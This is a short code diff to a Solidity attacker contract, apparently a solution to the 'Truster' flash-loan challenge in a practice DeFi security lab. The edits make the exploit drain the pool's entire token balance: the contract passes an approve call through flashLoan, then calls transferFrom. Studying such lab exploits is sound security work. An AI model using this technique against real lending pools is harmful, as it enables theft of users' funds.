@@ -15,12 +15,13 @@ contract TrusterAttacker {
     }
 
     function attack(address attackerEOA) external {
+        uint256 poolBalance = token.balanceOf(address(pool));
          bytes memory data = abi.encodeWithSignature(
-            "approve(address, uint256)", address(this), 1234
+            "approve(address,uint256)", address(this), poolBalance
         );
 
         pool.flashLoan(0, attackerEOA, address(token), data);
 
-        token.transferFrom(address(pool), attackerEOA, 0.000000001 ether);
+        token.transferFrom(address(pool), attackerEOA, poolBalance);
     }
 } 
